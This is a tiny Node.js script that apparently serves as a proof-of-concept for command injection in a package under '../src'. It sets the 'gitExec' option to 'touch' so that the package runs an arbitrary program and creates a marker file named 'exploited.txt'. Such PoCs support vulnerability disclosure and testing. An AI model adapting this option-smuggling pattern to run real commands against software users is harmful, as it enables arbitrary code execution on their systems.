'use strict'

const pkg = require('../src');

const commandOrArgs = 'exploited.txt';
const optionsOrCallback = {
    gitExec: 'touch'
};

pkg(commandOrArgs, optionsOrCallback, function() {});